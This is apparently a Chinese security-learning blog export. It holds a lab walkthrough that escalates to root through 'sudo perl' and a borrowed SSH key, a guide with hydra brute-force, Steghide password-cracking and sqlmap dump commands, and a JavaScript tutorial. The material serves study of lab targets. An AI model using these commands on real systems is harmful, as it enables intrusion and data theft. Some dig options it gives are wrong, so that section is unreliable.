&#108;&#x69;&#108;&#x79;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#52;&#51;&#46;&#x38;&#x30; 当前用户创造了id_ras密钥文件，而当前用户有权限去读取他，所以当前用户有权限去访问lily 通过使用指定的私钥文件 id_rsa 对Linux或Unix系统的用户 lily 进行安全登录。这个命令的工作原理如下： ssh 是Secure Shell的客户端程序，用于安全地访问远程主机。 -i id_rsa 参数指定了用于认证的私钥文件的路径。在这个情况下，文件名是 id_rsa（默认情况下，这个文件通常位于用户的 ~&#x2F;.ssh&#x2F; 目录下）。 lily 是要登录远程主机的用户帐号。 @ 分隔用户名和主机地址。 192.168.43.80 是远程服务器的IP地址。 综合以上信息，这条SSH命令的含义是：使用私钥文件 id_rsa 来以用户 lily 的身份登录到IP地址为 192.168.43.80 的远程服务器。 在执行这个命令之前，请确保： 私钥文件 id_rsa 存在且您有权限读取它。 远程服务器上的用户 lily 的 ~&#x2F;.ssh&#x2F;authorized_keys 文件中有与 id_rsa 文件相对应的公钥。 您的本地机器和远程服务器之间的网络连接畅通。 远程服务器的SSH服务运行在默认端口（通常是22），或者您已经用 -p 参数指定了正确的端口。 如果一切设置正确，您将能够无密码登陆远程服务器。如果有任何认证错误或连接问题，SSH客户端通常会提供错误信息来帮助您诊断问题。 发现有lily账号，而当前用户可以无密码登录远程服务器 ssh &#x6c;&#105;&#x6c;&#121;&#64;&#49;&#57;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#x35;&#54;&#46;&#x31;&#x30;&#50; 发现flag出现新的flag 查看历史记录发现没有什么有用的信息，这里从root入手，往上提权 看一下有什么用户可以用sudosudo -l 列出拥有root权限的用户 使用sudo perl -e ‘exec “&#x2F;bin&#x2F;bash”;’进行提权 该命令 sudo perl -e &#39;exec &quot;/bin/bash&quot;;&#39; 在 Linux 或类 Unix 系统中执行以下操作： sudo：以超级用户（root）的权限运行后续的命令。它通常需要用户输入他们的密码，除非已经在 sudoers 文件中对该用户进行了特定的配置，这样可以免密码运行一些命令。 perl：调用 Perl 语言的命令行解释器。 -e：告诉 Perl 直接从命令行执行随后的代码，而不是从文件中。 &#39;exec &quot;/bin/bash&quot;;&#39;：Perl 代码片段。在这个上下文中，exec 函数执行指定的命令，替换掉当前的进程。在这个例子中，它试图以 root 权限执行 /bin/bash。 所以，整个命令的目的是尝试以 root 用户权限启动一个新的 Bash shell。如果用户在 sudoers 文件中有权限无密码执行此操作，这将提供一个 root shell，即用户不需要知道 root 用户的密3码就可以获得完整的系统权限。 获取最终flag提权到root用户，cd到root目录，查看文件有.root.txt，打开后就是flag","categories":[{"name":"渗透笔记","slug":"渗透笔记","permalink":"http://zhoumuyun.com/categories/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"打靶机","slug":"打靶机","permalink":"http://zhoumuyun.com/tags/%E6%89%93%E9%9D%B6%E6%9C%BA/"}]},{"title":"渗透工具的使用","slug":"渗透工具的使用","date":"2024-01-07T11:03:45.000Z","updated":"2024-01-07T12:07:42.426Z","comments":true,"path":"2024/01/07/渗透工具的使用/","link":"","permalink":"http://zhoumuyun.com/2024/01/07/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"渗透工具的使用,介绍了nmap、dirsearch、hydra、dig、Steghide、sqlmap、小米范的使用","text":"渗透工具的使用,介绍了nmap、dirsearch、hydra、dig、Steghide、sqlmap、小米范的使用 nmap概念 nmap（Network Mapper）是一个开源、功能强大的网络扫描和安全审计工具。 基本语法基本语法：nmap [Scan Type(s)] [Options] &#123;target specification&#125; 主要扫描类型 -sS: TCP SYN 扫描（半开放扫描，较隐蔽） -sT: TCP connect() 扫描（完全连接扫描） -sU: UDP 扫描 -sV: 服务版本检测 -sC: 带默认脚本的扫描 -O: 操作系统检测 目标指定方式 可以是单个IP、IP范围、子网、主机名或者混合。 常用选项 -p: 指定端口号（例：-p 80 或 -p 1-65535） --top-ports: 扫描最常见的端口 -Pn: 禁用主机发现 --open: 只显示开放的端口 -A: 启用操作系统检测，版本检测，脚本扫描和traceroute -T: 设置扫描速度，从0（最慢）到5（最快） 输出控制 -oN: 正常输出到文件 -oX: XML格式输出到文件 -oG: Grepable格式输出到文件 -oA: 所以格式（上述三种）都输出到文件 高级选项 --script: 指定Nmap脚本引擎执行的脚本 --system-dns: 强制使用系统的DNS解析器 --traceroute: 执行路由跟踪 --reason: 显示端口的状态改变原因 --dns-servers: 指定DNS服务器进行解析 配置和扩展 Nmap拥有大量的内置脚本，通过脚本引擎（NSE）可以进行各种复杂的网络检测和攻击。 用户可以使用、编辑现有脚本或创建新脚本来扩展Nmap的功能。 参考链接：Nmap Official Site dirseach概念dirsearch 是一个Web路径扫描工具，主要用于对Web服务器进行路径枚举分析。 基本语法基本语法：dirsearch.py [-u|--url] target [-e|--extensions] extensions [options] 参数解释 -u 或 --url: 指定目标URL。 -e 或 --extensions: 指定搜索的文件扩展名，多个扩展名之间用逗号分割。 主要选项 --version: 显示程序版本并退出。 -h 或 --help: 显示帮助信息并退出。 必须的选项（Mandatory） -l 或 --url-list: 指定包含多个目标URL的列表文件。 --stdin: 从标准输入接收多个目标URL。 --cidr: 指定要扫描的CIDR地址块。 --raw: 从文件加载HTTP原始请求。 -f 或 --force-extensions: 强制为词典中每个条目添加扩展名。 字典设置（Dictionary Settings） -w 或 --wordlists: 指定使用的词典文件。 --prefixes&#x2F;--suffixes: 为词典中的每个项目添加前缀&#x2F;后缀。 --only-selected: 只保留选定扩展名的路径。 -U&#x2F;-L&#x2F;-C: 转换词典中的大小写或首字母大写。 通用设置（General Settings） -t 或 --threads: 指定扫描线程数。 -r 或 --recursive: 递归路径爆破。 -R 或 --recursion-depth: 设置递归的最大深度。 -i 或 --include-status: 包含特定的HTTP状态码。 -x 或 --exclude-status: 排除特定的HTTP状态码。 请求设置（Request Settings） -m 或 --http-method: 指定HTTP请求方法。 -d 或 --data: 指定HTTP请求体数据。 -H 或 --header: 指定HTTP请求头。 -F 或 --follow-redirects: 如果响应有重定向则跟随。 连接设置（Connection Settings） --timeout: 设置连接超时时间。 -s 或 --delay: 请求之间的延时。 --proxy: 设置使用的代理。 报告（Reports） -o 或 --output: 指定输出文件路径。 --format: 指定输出格式。 配置和扩展 可以通过修改配置文件 /etc/dirsearch/default.conf 来更改默认配置（如扩展名、超时时间）。 官方GitHub页面提供更多信息和更新。 参考链接：GitHub - maurosoria&#x2F;dirsearch HydraHydra简介Hydra是一个猜测&#x2F;破解有效登录名&#x2F;密码对的工具，使用AGPL v3.0许可协议。最新版本始终可在 https://github.com/vanhauser-thc/thc-hydra 获取。 命令语法1hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]] 参数选项 -R 恢复之前中断&#x2F;崩溃的会话 -I 忽略已存在的恢复文件（不用等待10秒） -S 执行SSL连接 -s PORT 如果服务使用的是非默认端口，请在这里定义 -l LOGIN 或 -L FILE 使用LOGIN名称登录，或从FILE中加载多个登录名 -p PASS 或 -P FILE 尝试密码PASS，或从FILE中加载多个密码 -x MIN:MAX:CHARSET 密码暴力破解生成，输入”-x -h”获取帮助 -y 在暴力破解中禁用符号使用（见上） -e nsr 尝试“n”空密码，“s”登录名作为密码，以及“r”反转的登录名 -u 围绕用户循环，而不是密码（与-x搭配使用效果好） -C FILE 使用冒号分隔的“login:pass”格式，替代-L&#x2F;-P选项 -M FILE 攻击的服务器列表，每行一个条目，使用’:’指定端口 -o FILE 将找到的登录&#x2F;密码对写入FILE而不是标准输出 -b FORMAT 为-o FILE指定格式：text(默认), json, jsonv1 -f 或 -F 发现一个登录&#x2F;密码对就退出（-M选项: -f适用于每个主机，-F为全局） -t TASKS 每个目标并行运行TASKS数量的连接（默认为16） -T TASKS 将TASKS的连接在所有的并行运行（针对-M选项，默认为64） -w &#x2F; -W TIME 响应的等待时间（默认为32）&#x2F;每个线程连接之间的等待时间（0） -c TIME 在所有线程上每次登录尝试的等待时间（强制-t 1） -4 &#x2F; -6 使用IPv4（默认）&#x2F; IPv6地址 -v &#x2F; -V &#x2F; -d 详细模式 &#x2F; 显示每次尝试的登录名和密码 &#x2F; 调试模式 -O 使用旧的SSL v2和v3 -K 不重新尝试失败的尝试（适用于-M大规模扫描） -q 不打印连接错误的消息 -U 服务模块使用详细信息 -m OPT 特定模块的选项，详细信息见-U输出 -h 更多命令行选项（完整帮助） 支持的服务列举了多种hydra支持的服务，例如adam6500、asterisk、cisco等。 环境变量代理设置使用HYDRA_PROXY_HTTP或HYDRA_PROXY环境变量进行代理设置，例如： 12export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080 使用示例12345hydra -l user -P passlist.txt ftp://192.168.0.1hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAINhydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5hydra -l admin -p password ftp://[192.168.0.0/24]/hydra -L logins.txt -P pws.txt -M targets.txt ssh digdig简介dig（Domain Information Groper）是一个命令行工具，用于查询域名系统（DNS）服务器。它可以用来查询各种类型的DNS记录，包括A记录、MX记录、CNAME记录等。dig命令非常强大，可以用来诊断DNS问题、查找域名的IP地址、跟踪DNS查询过程等。 域名解析实例当您运行以下命令时： 1dig qq.com 它将查询域名 “qq.com” 的DNS信息，并返回与该域名相关联的IP地址和其他DNS记录。以下是一个示例输出： 123456789101112131415161718192021; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; qq.com;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 32703;; flags: qr rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096;; QUESTION SECTION:;qq.com. IN A;; ANSWER SECTION:qq.com. 1800 IN A 202.179.176.42qq.com. 1800 IN A 184.30.231.44qq.com. 1800 IN A 184.30.231.42qq.com. 1800 IN A 202.179.176.41;; Query time: 13 msec;; SERVER: 127.0.0.53#53(127.0.0.53);; WHEN: Wed Jan 05 12:34:56 UTC 2024;; MSG SIZE rcvd: 106 上述输出显示了 “qq.com” 域名的DNS记录。这个域名有多个A记录，每个记录都对应一个不同的IP地址。这些IP地址可以用于访问 qq.com 网站或其他与该域名相关的服务。除了查询域名对应的IP地址之外，dig命令还具有以下功能： 查询方式 反向查询： 根据IP地址查询对应的域名。例如： 1dig -x 8.8.8.8 查询特定类型的记录： 可以使用-t选项来指定要查询的记录类型。例如，要查询域名的MX记录，可以使用以下命令： 1dig -t MX example.com 查询特定名称服务器： 可以使用-s选项来指定要查询的名称服务器。例如，要查询谷歌的名称服务器，可以使用以下命令： 1dig @8.8.8.8 example.com 跟踪查询过程： 可以使用-t选项来跟踪查询过程。例如，要跟踪查询example.com域名的A记录，可以使用以下命令： 1dig +trace example.com 设置查询超时时间： 可以使用-t选项来设置查询超时时间。例如，要将查询超时时间设置为5秒，可以使用以下命令： 1dig -t 5 example.com 以不同的格式输出结果： 可以使用-o选项来指定输出结果的格式。例如，要以JSON格式输出结果，可以使用以下命令： 1dig -o json example.com 保存查询结果到文件： 可以使用-f选项将查询结果保存到文件中。例如，要将查询example.com域名的A记录的结果保存到文件中，可以使用以下命令： 1dig example.com &gt; example.com.txt 使用DNSSEC验证查询结果： 可以使用-s选项来启用DNSSEC验证。例如，要使用DNSSEC验证查询example.com域名的A记录，可以使用以下命令： 1dig +dnssec example.com Steghide工具介绍Steghide 是一款功能强大的隐写术工具，其特点包括： 开源软件，适用于多种平台。 可以将数据隐藏在图片或音频文件中，不留痕迹。 提供了命令行界面，操作需要通过输入特定命令。 支持数据嵌入和提取，以及使用密码保护隐写内容。 用于在图像或声音文件中嵌入或提取隐秘数据。提到steghide info trytofind.jpg时，这条命令是在用Steghide软件检查名为trytofind.jpg的JPEG图像文件中是否包含隐秘嵌入的数据。 当你在支持Steghide的命令行环境中运行此命令时，Steghide会尝试分析图像文件，并给出关于是否存在嵌入数据的信息，以及一些额外的相关信息（如果有的话）。这个命令并不会提取数据，只提供信息。 如果图像中包含隐秘数据，Steghide可能会要求你输入密码，以便给出更多关于嵌入信息的详情。如果没有隐秘数据或者操作失败，Steghide将返回错误或者表示没有发现隐秘数据的消息。 要使用Steghide，你需要在系统上安装Steghide软件。在某些Linux发行版上，可以通过包管理器安装它，例如使用以下命令（针对基于Debian的系统，如Ubuntu） 用法介绍嵌入数据 (**embed -ef -cf -p**): embed 或 --embed: 嵌入数据。 -ef 或 --embedfile: 选择要嵌入的文件。 -cf 或 --coverfile: 选择用作隐写的封面文件。 -p 或 --passphrase: 指定密码短语。 提取数据 (**extract -sf -p**): extract 或 --extract: 提取数据。 -sf 或 --stegofile: 选择要从中提取数据的隐写文件。 -p: 同上，指定密码短语。 用法示例嵌入数据:1steghide embed -cf test.jpg -ef secret.txt -p 123456 此命令会将 secret.txt 文件隐藏到 test.jpg 图片中，并使用密码 123456 保护。 提取数据:1steghide extract -sf test.jpg -p 123456 此命令会尝试用密码 123456 从 test.jpg 图片中提取隐藏的数据。 Steghide密码爆破Steghide本身不包含密码爆破功能，但可结合外部脚本&#x2F;工具实现密码破解。一个简单的密码爆破脚本 bruteStegHide.sh 例子如下： 123456789#!/bin/bashfor line in `cat $2`; do steghide extract -sf $1 -p &quot;$line&quot; &gt;/dev/null 2&gt;&amp;1 if [[ $? -eq 0 ]]; then echo &#x27;Password found: &#x27; &quot;$line&quot; exit fidone 脚本用法:1./bruteStegHide.sh test.jpg passwd.txt steghide info 此脚本会使用 passwd.txt 文件中列出的密码对 test.jpg 图片进行破解尝试。 steghide info 是 steghide 工具中的一个命令，用于提供关于使用 steghide 隐藏数据的隐写文件的信息。此命令不会提取或显示隐秘内容，而是展示隐写文件的一些基础属性和相关统计信息，例如嵌入数据的大小，是否进行了加密，嵌入数据的加密算法，以及是否需要密码来提取嵌入信息等。 用法如下： 1steghide info [stegofile] 其中 [stegofile] 是你想要检查的隐写文件的名称。 如果隐写文件被保护了密码，steghide 可能会要求你输入密码，以解锁更多的信息。如果没有设置密码或者输入的密码正确，steghide 会显示关于隐写文件的信息。如果密码错误或文件中没有嵌入信息，steghide 会显示一个错误消息。 steghide extract -sf 您提供了一个使用 Steghide 提取隐写内容的命令： 1steghide extract -sf trytofind.jpg 该命令会尝试从名为 trytofind.jpg 的图片文件中提取隐藏的信息。这里 -sf 参数表示隐写文件，即包含隐写内容的文件。在执行这个命令时，Steghide 通常会要求您输入密码（passphrase），因为大多数隐写内容会用密码进行保护。 如果图片中确实含有用 Steghide 嵌入的数据，并且您输入了正确的密码，隐藏的信息将会被提取出来。如果该命令执行成功，Steghide 通常会告诉您提取的文件名，除非嵌入数据时设置了不输出文件名。如果执行失败（例如密码不正确），则不会提取任何数据。 请注意，在没有 -p 参数的情况下，该命令会提示您手动输入密码；如果您有密码并希望在命令中直接包括它，可以使用 -p 参数，如下： 1steghide extract -sf trytofind.jpg -p your_passphrase_here 如果您不知道密码，那么您将需要猜测或使用暴力破解的方法来尝试找到正确的密码。 sqlmap工具介绍SQLmap是一款开源的渗透测试工具，可以帮助安全研究人员和渗透测试人员发现和利用SQL注入漏洞。SQL注入漏洞是一种常见的Web应用程序漏洞，它允许攻击者通过精心构造的SQL查询来访问或修改数据库中的数据。 SQLmap具有以下特点： 自动化： SQLmap可以自动检测和利用SQL注入漏洞，无需用户手动编写SQL查询。 易于使用： SQLmap具有友好的用户界面，即使是新手也可以轻松使用。 强大： SQLmap支持多种类型的SQL注入漏洞，包括基于布尔值、基于时间的和基于错误的SQL注入漏洞。 全面： SQLmap可以检测和利用各种类型的数据库，包括MySQL、PostgreSQL、Oracle和Microsoft SQL Server。 SQLmap可以用来执行以下任务： 检测SQL注入漏洞： SQLmap可以自动检测Web应用程序中的SQL注入漏洞。 利用SQL注入漏洞： SQLmap可以利用SQL注入漏洞来访问或修改数据库中的数据。 窃取数据： SQLmap可以窃取数据库中的敏感数据，例如用户名、密码和信用卡信息。 执行任意SQL查询： SQLmap可以执行任意SQL查询，这可以用来修改数据库中的数据或执行其他管理任务。 SQLmap是一个非常强大的工具，可以帮助安全研究人员和渗透测试人员发现和利用SQL注入漏洞。它对于保护Web应用程序免受SQL注入攻击非常有用。 示例 检测SQL注入漏洞： 1sqlmap -u &quot;http://example.com/index.php?id=1&quot; --dbs 利用SQL注入漏洞窃取数据： 1sqlmap -u &quot;http://example.com/index.php?id=1&quot; --dump 执行任意SQL查询： 1sqlmap -u &quot;http://example.com/index.php?id=1&quot; --sql=&quot;SELECT * FROM users&quot; Windows环境使用需要python环境，用python进行运行 12345python sqlmap.py -u &quot;http://192.168.2.78/sqli/Less-1/?id=1&quot; --dbs --batchpython sqlmap.py -u &quot;http://192.168.2.70/sqli/Less-1/?id=1&quot; --batch -D security -T users -C &quot;id,username&quot; --dumppython sqlmap.py -r ../1.txt --batch --risk=3 --level=3 --dbs 具体使用基本选项 -h, –help 显示简短帮助信息并退出 -hh 显示完整帮助信息并退出 –version 显示程序的版本号并退出 -v VERBOSE 设置详细级别（0至6，默认为1） 目标定义必须至少提供以下选项之一来定义目标 -u URL, --url=URL 设置目标URL（例：”http://www.site.com/vuln.php?id=1&quot;） -g GOOGLEDORK 使用Google dork结果作为目标URL -d DIRECT：用于直接数据库连接的连接字符串 -l LOGFILE：从Burp或WebScarab代理日志文件中解析目标 -m BULKFILE：从文本文件中扫描多个目标 -r REQUESTFILE：从文件加载HTTP请求 -c CONFIGFILE：从INI格式的配置文件加载选项 请求参数 –data&#x3D;DATA 发送POST数据（例：”id&#x3D;1”） –cookie&#x3D;COOKIE 设置HTTP Cookie值（例：”PHPSESSID&#x3D;a8d127e..”） –random-agent 使用随机用户代理 –proxy&#x3D;PROXY 设置使用的代理（例：”","categories":[{"name":"渗透笔记","slug":"渗透笔记","permalink":"http://zhoumuyun.com/categories/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"工具介绍","slug":"工具介绍","permalink":"http://zhoumuyun.com/tags/%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D/"}]},{"title":"JavaScript基础和函数","slug":"JavaScript基础和函数","date":"2024-01-06T11:05:35.000Z","updated":"2024-01-06T12:19:37.931Z","comments":true,"path":"2024/01/06/JavaScript基础和函数/","link":"","permalink":"http://zhoumuyun.com/2024/01/06/JavaScript%E5%9F%BA%E7%A1%80%E5%92%8C%E5%87%BD%E6%95%B0/","excerpt":"这篇介绍了javascript的基础和函数","text":"这篇介绍了javascript的基础和函数 JavaScript基础注释1234//单行注释/*多行注释*/ 引入可以直接在HTML的script里面进行引入 数据类型1，number 数字，不论是整数还是小数，数据类型都是number 2，string 字符串 3，boolean 布尔值 true和false 4，object 对象 被new出来的东西都是对象 5，undefined 这个表示没有定义，所有没有被定义过的都默认是对象 六种声明变量的方法：var: var 是 JavaScript 中声明变量的关键字。 使用 var 声明的变量是全局变量或函数作用域变量。 全局变量可以在脚本的任何地方访问，而函数作用域变量只能在声明它们的函数内部访问。 var 允许变量重新声明和重新赋值 let: let 是 JavaScript 中声明变量的另一个关键字。 使用 let 声明的变量是块级作用域变量。 块级作用域变量只能在声明它们的块（例如，函数体、循环体）内部访问。 let 不允许变量重新声明，但允许重新赋值。 const: const 是 JavaScript 中声明常量的关键字。 使用 const 声明的变量是常量，这意味着它们的值不能被改变。 常量必须在声明时初始化，并且不能重新赋值。 function: function 是 JavaScript 中定义函数的关键字。 函数是一组可以被调用的语句。 函数可以接收参数，并返回一个值。 JavaScript 中有两种类型的函数：函数声明和函数表达式。 import: import 是 JavaScript 中导入模块的关键字。 模块是 JavaScript 代码的独立单元，可以被其他模块导入和使用。 import 语句允许你将其他模块的代码导入到你的模块中。 class: class 是 JavaScript 中定义类的关键字。 类是对象的蓝图，它定义了对象的属性和方法。 你可以使用 class 关键字来创建新的类，并使用 new 关键字来创建类的实例。 总结： var、let 和 const 用于声明变量，但它们的作用域和赋值规则不同。 function 用于定义函数，函数可以接收参数并返回一个值。 import 用于导入模块，模块是 JavaScript 代码的独立单元。 class 用于定义类，类是对象的蓝图，它定义了对象的属性和方法。 var声明变量在没有声明之前不能用如果一个变量还没有被赋值，此时该变量不应该被使用，否则很危险 1234var a,b,c; //声明变量var d =10; //正确的赋值cosole.log(d); //调用控制台，并输出，类似python的printconsole.log(typeof(d));//查看数据类型 如果两个数一起进行声明赋值12var a,b=18;//a没有初始化，b被初始化，b=18 let声明同一个作用域里面，let声明的变量，不允许声明两次 因为只在同一作用域里面，不允许重新声明，所以很多用在闭包里面 1234567let abc = &quot;我爱你&quot;；//全局console.log(abc)let abc = &quot;我不爱你了&quot;//不允许function fn()&#123; let abc=&#x27;xxx&#x27;;//这是局部作用域，可以 let abc=&#x27;xxx&#x27;;//不允许&#125; 显式声明和隐式声明显式声明是指在使用变量之前使用 var、let 或 const 关键字来声明它。 12345678// 使用 var 关键字显式声明变量var name = &quot;John Doe&quot;;// 使用 let 关键字显式声明变量let age = 30;// 使用 const 关键字显式声明常量const city = &quot;New York&quot;; 隐式声明是指在没有使用 var、let 或 const 关键字的情况下声明变量。 隐式声明的变量都是 var 变量。 12345678// 使用隐式声明声明变量name = &quot;John Doe&quot;;// 使用隐式声明声明变量age = 30;// 使用隐式声明声明常量city = &quot;New York&quot;; 字符串字符串和数字拼接12345var b=&#x27;11111&#x27;;console.log(b+10); console.log(10+b); //如果+左右两边任意数据是字符串，结果就是字符串拼接console.log(5+5); //将会计算5+5的值 字符串转化成数字12345var b=&#x27;11111&#x27;;var c = parseInt(b); //parseInt(b)方法相当于int(b)console.log(c+5); //计算11111+5的值 数字转化成字符串12345d= 10086f = d.toString() //官方f= d+&#x27;&#x27;console.log(typeof(f)) //野路子console.log(f) 字符串方法1234567var s = &#x27;yiersansiwuliuqi&#x27;;console.log(s.split(&quot; &quot;));//切割console.log(s.substr(3,4)) //substr(start,len)console.log(s.substring(3,4)) //s[3:4]console.log(s.length)//len(s)console.log(s.charAt(3))//s[3]console.log(s.indexOf(&#x27;yiersansi&#x27;)) //判断有没有，返回bool值 运算符比较大小12var a = 3 &lt; 2;console.log(a) //得到的是boolean值 and or not1console.log((3.2) || (1&gt;5)) &#x3D;&#x3D;和&#x3D;&#x3D;&#x3D;1234a= &#x27;10086&#x27;b=10086console.log(a==b) //==判断两端的值console.log(a===b) // ===判断两端的值，同时判断数据类型 三目运算1234567var a = 10var b = 22var c = a &gt; b ? a : b //表达式比1？结果1：结果2a= 20b=10var c = a &gt; b ? a : b ? a :bvar c = a &gt; b ? (a) : (b ? a :b) //输出a 20 建立数组1var arr = new Array(); 自增和自减 前缀自增 (++i)：首先将变量的值增加1，然后返回新的值。 后缀自增 (i++)：首先返回变量的当前值，然后将变量的值增加1 1234567891011var i =10;i++; //让i自增1，i+=1 ,类似c语言++i;//让i自增1，i+=1i--;//让i自减1，i-=1--i;//让i自减1，i-=1let i = 0;let j = ++i; // j等于1, i也等于1let k = i++; // k等于1, 但i现在等于2let value = &quot;5&quot;;value++; // value被转换成数字并增加1，现在是6 JavaScript函数计时器单次计时器，只会执行一次 12setTimeout()是设置一个定时器，1000毫秒之后，执行一个函数clearTimeout()是清除定时器 1234setTimeout(function()&#123; alert(&#x27;两秒后执行&#x27;)&#125;,2000);//单位是毫秒windows.clearTimeout(t) 循环计时器，会一直循环执行 12setInterval()是设置一个定时器，每隔1000毫秒，执行一个函数clearInterval()是清除定时器 12345var t = setInterval(function () &#123; alert(&quot;1秒之后执行&quot;);&#125;,1000);//两秒后清理setTimeout(function ()&#123;window.clearInterval()&#125;,2000); 时间12345678var date = new Date();//创建一个日期对象，默认情况就是系统时间console.log(date);var year = date.getYear();console.log(year);//不是完整的，从1900年开始计算var year2 = date.getFullYear()console.log(year2);//完整正常的年份var month = date.getMonth();console.log(month)//月份从0开始 eval函数本质就是将字符串里面的函数运行，参数一定是一个字符串，一般不会使用 123s=&quot;console.log(&#x27;web2302&#x27;)&quot;eval(s) //在console输出web2302 eval可以进行加解密 加密网站:https://www.w3cschool.cn/tools/index?name=evalencode 12//将console(&#x27;web2302&#x27;)进行加密eval(function(p,a,c,k,e,d)&#123;e=function(c)&#123;return(c&lt;a?&#x27;&#x27;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!&#x27;&#x27;.replace(/^/,String))&#123;while(c--)d[e(c)]=k[c]||e(c);k=[function(e)&#123;return d[e]&#125;];e=function()&#123;return&#x27;\\\\w+&#x27;&#125;;c=1&#125;;while(c--)if(k[c])p=p.replace(new RegExp(&#x27;\\\\b&#x27;+e(c)+&#x27;\\\\b&#x27;,&#x27;g&#x27;),k[c]);return p&#125;(&#x27;0(&quot;1&quot;)&#x27;,62,2,&#x27;console|web2302&#x27;.split(&#x27;|&#x27;),0,&#123;&#125;)) 而要解密也很简单，用一个变量接受，然后打印就出来了 console控制台默认不能粘贴，输入allow pasting 就可以粘贴了 用一个变量接受加密的内容，然后可以打印了 1var m = function(p,a,c,k,e,d)&#123;e=function(c)&#123;return(c&lt;a?&#x27;&#x27;:e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))&#125;;if(!&#x27;&#x27;.replace(/^/,String))&#123;while(c--)d[e(c)]=k[c]||e(c);k=[function(e)&#123;return d[e]&#125;];e=function()&#123;return&#x27;\\\\w+&#x27;&#125;;c=1&#125;;while(c--)if(k[c])p=p.replace(new RegExp(&#x27;\\\\b&#x27;+e(c)+&#x27;\\\\b&#x27;,&#x27;g&#x27;),k[c]);return p&#125;(&#x27;0(&quot;1&quot;)&#x27;,62,2,&#x27;console|web2302&#x27;.split(&#x27;|&#x27;),0,&#123;&#125;); prototypeprototype可以动态的给类增加功能扩展 就是往里面加内容，硬往里面加 123456789101112131415161718//创建一个类，对某一事物的归纳总结//有点类似java中的构造方法function Person(name,age)&#123; this.name = name; this.age = age; this.say = function () &#123; console.log(&quot;我叫&quot;+this.name+&quot;今年&quot;+this.age+&quot;岁&quot;); &#125;&#125;//创建一个对象p1 = new Person(&quot;张三&quot;, 20);p2 = new Person(&quot;李四&quot;, 30);p1.say();//prototype可以动态的往类里面加功能(方法)Person.prototype.play = function (name) &#123; console.log(this.name+&quot;喜欢和&quot;+name+&quot;一起玩&quot;);&#125;p1.play(&quot;王五&quot;); 变量提升js里面代码执行顺序不是完全从上到下的，js代码在运行的时候，会对代码进行检测 如果有个变量被用到了，而变量在后面创建，会被检测到，声明会提前 检测逻辑：如果变量放在后面，而代码中调用了，就会把声明提前，只管声明不管赋值 1234function fn()&#123; console.log(name); var name = &quot;alex&quot;;&#125; 实际代码会变成 12345function fn()&#123;//声明提前了，但是没有值，打印undefined var name； console.log(name); name = &quot;alex&quot;;&#125; 当把var换成let或者const就不会被提前 let和const不会被多次定义 1234function fn()&#123;//声明不会被提前，会出现ReferenceError console.log(name); let name = &quot;name&quot;;&#125; 总结： 变量提升仅仅提升声明，不提升初始化或赋值操作。如果一个变量在声明之前使用，它的值将是undefined。 函数声明也会被提升，但函数表达式不会。这意味着你可以在声明函数之前调用它，但如果你使用一个函数表达式，这种调用将会失败。 ES6引入了let和const关键字，这两者创建的变量不会被提升。如果你在声明之前尝试使用这些变量，将会导致ReferenceError。 匿名函数JavaScript的匿名函数是指没有具体名称的函数，它们通常只用于需要执行一次的场合。在JavaScript中，函数有多种用途和写法。以下是匿名函数的一些主要特点和用法： 闭包实现：匿名函数可以创建闭包，让函数内部的变量可以在外部访问，这对于封装变量非常有用。 模拟块级作用域：JavaScript中的函数可以创建新的作用域，函数可以用来模拟块级作用域，减少全局变量污染。 立即执行函数表达式（IIFE）：匿名函数可以立即执行，常见的形式是(function()&#123;...&#125;)();。这种模式非常适合初始化代码，因为它可以立即执行而不干扰其他部分的代码。 事件处理和回调函数：匿名函数经常用于事件处理和回调函数中，因为它们往往只需要在特定事件发生时执行一次。 匿名函数的定义通常包含在多个小括号中，这样可以避免语法错误，并且能够立即执行函数内部的代码。例如： 1234(function () &#123; console.log(&#x27;这是一个匿名函数&#x27;);&#125;)();(function()&#123;&#125;)();//本质就是这样 闭包外层函数对内层函数的使用 只能通过闭包函数的返回值来更改闭包里面的数据。 不能直接访问闭包函数内部的变量。 当把变量放在全局，一个变量很容易就会被别人更改 当形成一个自己的闭包，变量就不会被改变，但是闭包会占用很多内存 123456let name = &#x27;周杰伦&#x27;;//全局变量function fn()&#123; name = &quot;王力宏&quot;; //修改了全局变量&#125;fn()console.log(name); //变成了王力宏 将变量放到闭包里面 123(function()&#123; var name = &#x27;alex&#x27;;//变成了局部变量&#125;)(); 闭包的使用 当你想要调用闭包里面的东西，无法直接使用闭包里面jiami 只能通过返回值进行调用，多个方法就要多个返回值 函数的返回值-&gt; 返回给调用的位置了 用一个变量mm接受返回值，这里的返回值是一个函数 12345678910var mm = (function()&#123; //写一个加密功能 let key = &quot;10086&quot;; let jiami = function(data)&#123; console.log(&quot;我要开始加密了，密钥是&quot;+key+&quot;,加密的密文是：&quot;+data); return &quot;加密好的字节&quot; &#125; return jiami; //返回了一个函数&#125;)()；mm(&quot;我要开始加密了&quot;) 123456789101112131415161718192021222324252627282930313233let jm = (function () &#123; //写一个加密功能 let key = &quot;10086&quot;; let process = function (data) &#123; 